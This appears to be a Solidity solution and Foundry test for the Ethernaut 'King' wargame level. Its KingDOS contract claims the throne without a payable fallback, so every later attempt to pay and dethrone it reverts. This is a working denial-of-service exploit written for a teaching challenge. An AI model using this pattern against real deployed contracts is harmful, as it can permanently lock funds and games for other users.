// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract KingDOS {
    // no fallback ;)

    function lockThrone(address king) external payable {
        (bool success,) = king.call.value(msg.value)("");
        assert(success);
    }
}

pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {King} from "../../src/King/Level.sol";

interface IKing {
    function _king() external view returns (address payable);

    function prize() external view returns (uint);
}

interface IKingDos {
    function lockThrone(address king) external payable;
}

contract KingTest is LevelFactory {
    IKing king;
    IKingDos kingDos;

    function setUp() public {
        vm.startPrank(deployer); // deploy the contract as deployer
        vm.deal(deployer, 5 ether);
        king = IKing(address((new King).value(1 ether)()));
        kingDos = IKingDos(address(new KingDOS()));
        vm.stopPrank();
    }

    function testAttack() public {
      submitLevel("King");
    }

    function _performTest() internal override {
        kingDos.lockThrone.value(2 ether)(address(king));
        assert(address(king._king()) == address(kingDos));
    }

    function _setupTest() internal override {
      super._setupTest();
      vm.deal(attacker, 5 ether);
    }

    function _checkTest() internal override returns (bool) {
        vm.stopPrank();
        vm.prank(deployer);
        (bool success,) = address(king).call("");
        assertFalse(success);

        return !success;
    }
}
